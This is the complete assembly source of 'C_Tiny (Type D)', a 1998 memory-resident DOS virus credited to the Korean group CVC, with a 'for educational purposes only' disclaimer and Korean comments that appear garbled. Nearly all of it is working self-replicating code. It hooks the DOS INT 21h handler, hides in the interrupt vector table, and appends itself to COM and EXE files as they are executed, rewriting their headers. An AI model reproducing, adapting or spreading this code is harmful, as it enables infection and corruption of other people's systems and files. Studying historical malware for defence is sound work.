;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;					     \\\\\\\  \       \   \\\\\\\
;	 C_Tiny    (Type D)		    \	       \     \	 \
;					    \		\   \	 \    98/05
;					    \		 \ \	 \
;					     \\\\\\\	  \	  \\\\\\\ #04
;
; Virus Name : C_Tiny (Type D)
; Author     : Crom
; Group      : CVC
; Origin     : Corea
; Date	     : 1998/05/02
; Type	     : Memory resident COM/EXE
;
;  !*< ¤óŸI¸â ·¢ >********************************************************!
;   *									     *
;   * ‰w‰¡ !								     *
;   *	     ·¡ ¸÷¥¡“e Ša·B¸â·¥ ¡¢¸â·a¡ e ¬a¶w–A´á´¡ Ðs“¡”a. ¶Ÿ¡“e ·¡      *
;   *	     ¸÷¥¡Ÿi ¬a¶wÐ¬á ¤i¬—Ða“e ´á˜å ¢…¹AµA ”Ð¬á•¡ À‚·±·i »¡»¡ ´g    *
;   *	     ¯s“¡”a. ¡¡—e À‚·±·e ‹i·i ·ª“e ¬aœqµA‰A ·¶¯s“¡”a.		     *
;   *									     *
;   * Warning ! 							     *
;   *	     This information is for educational purposes only. We are	     *
;   *	     not responsible for any problems caused by the use of this      *
;   *	     information. Responsibility is entirely placed on the reader    *
;   *									     *
;   !************************************************************************!
;
; ˆe”eÐe œ‘¬wº ¤a·¡œá¯a¡ ·¥ÈáœóËa ¥BÈá º­¡ÎaµA ¬wºÐe”a. (0020:0000)
; ·¥ÈáœóËa ¥BÈáµA ¬wºÐa£a¡ ¸aÃµ ¸i¡µÐa¡e ¯¡¯aÉQµA Ã¡¡w¸â·© ® ·¶”a. ˜aœa¬á
; ¤a·¡œá¯a“e ·¥ÈáœóËa ¥BÈá º­¡Îa· ¶w·¡ 0 ·¥»¡ ˆñ¬a Ðe”a. 0 ·¡ ´a“¡œa¡e ·¡
; £¡ ¬wºÐ ·¶ˆáa ÄñÏAÈáµA¬á ¬a¶wÐa‰¡ ·¶”a.
;
; D Ñw·e EXE Ìa·©•¡ ˆqµq¯¡Ç© ® ·¶”a. Å¡—aˆa IVT ¬wºÑw ¤a·¡œá¯a· Ðe‰µA ˆá·
; ·B¤bÐ ·¶»¡ e 300 ¤a·¡Ëaˆa ´e–A“e Ça‹¡¡ COM,EXE Ìa·© ¡¡– ˆqµq ¯¡Ç© ® ·¶”a.
; ÐeŠ‚¬e ¤a·¡œá¯aº— ˆa¸w¸b·e Ça‹¡· COM/EXE ˆqµq ¤a·¡œá¯a·© ˆõ·¡”a.
; ”aŸe ¦ˆa ‹¡“w•¡ ý‰¡ ¯¼´ö»¡ e ¤a·¡œá¯a Ça‹¡ ˜¢…µA ´á¼é ® ´ô´ö‰¡ ˆa“wÐe ÂA
; ¸âÑÁŸi Ða‹¡ ¶áÐ¬á ‘¡bÐ–”a.
;
;  C_Tiny (Type A) : ÂAÁ¡ ¤á¸å
;  C_Tiny (Type B) : ´¢ˆe· Anti-Heuristic ‹¡¤ó ¬a¶w
;  C_Tiny (Type C) : ¯¡¸b¸ñ ŠÐa“e ¤w¤ó·¡ ¤aŽñ (Anti-Heuristic)
;  C_Tiny (Type D) : EXE Ìa·©•¡ ˆqµq, ¶å•¡¶ Ìa·© ˆqµq ¹A¶A
;
;  ´|·a¡ Anti-Heuristic ·i ¬a¶wÐa“e ¤á¸å·i  a»¡ b·a¡ C_Tiny “e {‰Œa Ðe”a.
;
;  Thanx : Dark Angel, T„L”N
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

	    .MODEL  TINY
	    .CODE
	    .286

            org   0h
 Mem_size   equ   offset End_Memory	; ¡A¡¡Ÿ¡ Ça‹¡
 Vir_size   equ   offset End_virus	; ¯©¹A ¤a·¡œá¯a Ça‹¡
 EXE_ID     equ   'CT'                  ; EXE Ìa·© ¯¢¥i¸a

 C_Tiny:
            db    0E8h, 0, 0            ;
            pop   si                    ; ¤a·¡œá¯a ¯¡¸b¸ñ ŠÐa‹¡
            sub   si, 0003              ;
            push  ds
            xor   ax,ax                 ; Å¡—a· ÂA¸âÑÁŸi ¶áÐ¬á ´|¦¦…·i ¤a
            mov   es,ax                 ; Ž´ö”a.
            mov   di, 0200h             ;
	    mov   cx, Mem_size		; ¤a·¡œá¯a ‹©·¡  eÇq §¡Ša
            push  di
 Check_IVT_Zero:
            repz  scasb                 ; 0000:0200 µA¬á ¤a·¡œá¯aÇa‹¡ eÇq §¥‰·
            pop   di                    ; ˆe ·¥»¡ ˆñ¬aÐe”a.
            jnz   ChkCOMorEXEFile       ; §¥‰·ˆe·¡ ´a“¡¡e ¬wº Í¡‹¡

 Copy_Vir_IVT:
            push  si                    ;
            mov   cx, Vir_size          ; ¤a·¡œá¯a ‹©·¡
	    db	  2Eh			; CS:SI -> ES:DI
            repz  movsb                 ; ¤a·¡œá¯a ¯¡¸b¶áÃ¡ -> 0000:0200
            pop   si                    ; SI = ¤a·¡œá¯a ¯¡¸b¸ñ

            push  es                    ;
            pop   ds                    ; DS=0000
            mov   di, offset End_Virus + 200h ; 200h ·e IVT º­¡ˆt (0:200h)
            mov   ax, offset NewInt21   ; ·¥ÈáœóËa 21h µ¡Ïa­U
            xchg  ax, ds:[0084h]
            stosw                       ; ­A‹a åËa ¥e‰w
            mov   ax, 20h               ; ¤a·¡œá¯a ­A‹a åËa“e (0020h)
                                        ; µ¡Ïa­U·¡ 00xxh ·¡‹¡ ˜¢…µA AL µA ý·q
            xchg  ax, ds:[0086h]
            stosw                       ; AX=ES:DI
            pop   ds                    ; Àõ¦¦…µA¬á ¸á¸wÐ–”å DS
 chkCOMorEXEFile:
            add   si, offset OldHeader  ; SI = ¯¡¸b¸ñ + ¶¥œÑA”á¯¡¸b¸ñ
            mov   di,100h               ; COM Ìa·©·¥»¡ ˆñ¬a
            cmp   word ptr DS:[DI],0E94Dh
            jnz   Return_EXE

 Restore_COM_Head:
	    push  cs
	    pop   es
	    push  di			; ·¡•·Ði º­¡ ¸á¸w
	    movsw			; 4 ¤a·¡Ëa ¥¢Š
	    movsw			;
	    ret 			; CS:100h ¡ ·¡•·

 Return_EXE:                            ; EXE ¥¢Š
            push  ds
            pop   es
            mov   ax,ds
            add   ax,10h
            add   word ptr cs:[si+2],ax ;
            jmp   dword ptr cs:[si]     ;

 OldHeader  dw    0h                    ; ¶¥œ COM ´|¦¦…
            dw    0FFF0h                ; µa‹¡µA 10h ·i ”áÐa¡e 0 ·¡–E”a.
            db    'C_TinyD'             ; ¤a·¡œá¯a ·¡Ÿq

 lseek:
	    mov   ah,42h		; Í¡·¥Èá
	    xor   cx,cx
	    cwd
	    int   21h
	    ret

 InfectEXE:
            push  ax                    ; file size
	    push  dx

            push  si
            mov   si, offset FileBuffer+14h
            movsw
            movsw

            add   ax, vir_size          ; ¤a·¡œá¯a ‹©·¡ ”áÐa‹¡
	    adc   dx,0

            mov   cx,200h               ; / 512
	    div   cx

            or    dx,dx                 ; a á»¡ˆa ¹¥¸Ða“eˆa ?
	    jz	  nohiccup
	    inc   ax
  nohiccup:
            pop   si
            mov   word ptr ds:[si+4],ax
            mov   word ptr ds:[si+2],dx

	    pop   dx
	    pop   ax

            mov   cx,10h                ;
	    div   cx

            sub   ax,ds:[si+8]

            mov   di, offset FileBuffer + 12h
            push  ax
            mov   ax, EXE_ID
            stosw                       ; EXE_ID [DI+12h]
            xchg  ax,dx
            stosw                       ; DI+14h -> IP
            pop   ax
            stosw                       ; DI+16h -> CS
	    jmp   Write_Virus

 NewInt21:
	    pusha			; 286 + µA¬á »¡¶¥
	    push  ds
	    push  es

	    xor   ah,4Bh		; ¯©Ð—·¥ˆa ?
            jnz   Error

            mov   ax,  3D02h            ; Ìa·© µi‹¡
            int   21h
            jc    Error                 ; µi‹¡ µAœá ?
            xchg  ax,bx                 ; BX = Ìa·©Ð…—i

	    push  cs			; ­A‹a åËa É··©
	    pop   ds
	    push  cs
	    pop   es

            mov   ah, 3Fh               ; Ìa·© ·ª‹¡
            mov   cx, 18h               ; ¤a·¡Ëa®
            mov   dx, offset FileBuffer ; ¤áÌá º­¡
            int   21h

            mov   si, dx
            mov   di, offset OldHeader

            mov   al,2                  ; Ìa·© {·a¡ ·¡•·
            call  lseek

            cmp   byte ptr [SI+18h], '@'; ¶å•¡¶ Ìa·©·¥ˆa ?
            jz    Close
            cmp   word ptr [SI+12h],EXE_ID   ; EXE ˆqµqµa¦ ˆñ¬a
            jz    Close
            cmp   word ptr [SI], 0E94Dh ; ˆqµq–E COM Ìa·©
	    jz	  Close
            cmp   word ptr [SI], 'ZM'   ; EXE Ìa·©·¥ˆa ?
	    jz	  InfectEXE

            push  si
            movsw                       ; COM ÑA”á¦¦… ¸á¸w
            movsw
            pop   di                    ; FileBuffer

            push  ax
            mov   ax, 0E94Dh            ; ˆqµq ¯¢¥i¸a + JMP
            stosw                       ; JMP -> FileBuffer
            pop   ax
            sub   ax,0004               ;
            stosw

 Write_Virus:
            mov   ah, 40h               ; ¤a·¡œá¯a ³a‹¡
            mov   cx, offset Vir_size   ; ¤a·¡œá¯a ‹©·¡
	    xor   dx,dx 		; ¤áÌá µ¡Ïa­U
            int   21h

	    xor   al,al 		; Ìa·© Àá·q·a¡ ·¡•·
            call  lseek

            mov   ah, 40h               ; ´|¦¦… ³a‹¡
            mov   cx, 18h               ; ¤a·¡Ëa ®
            mov   dx, offset FileBuffer ; µ¡Ïa­U
            int   21h

 Close:
            mov   ah, 3Eh               ; Ìa·© ”h‹¡
            int   21h
 Error:
	    pop   es
	    pop   ds
	    popa
 Jmp_Org_Int21:
	    db	  0EAh			; --> µa‹¡Œa»¡ Ìa·©µA ¸á¸w
 End_Virus:
            dw    ?,?                   ; Old Int 21h
 FileBuffer db    18h dup (0)

 End_Memory:                            ; ¡A¡¡Ÿ¡µA¬á ¤a·¡œá¯a { ¶áÃ¡
	    END   C_Tiny
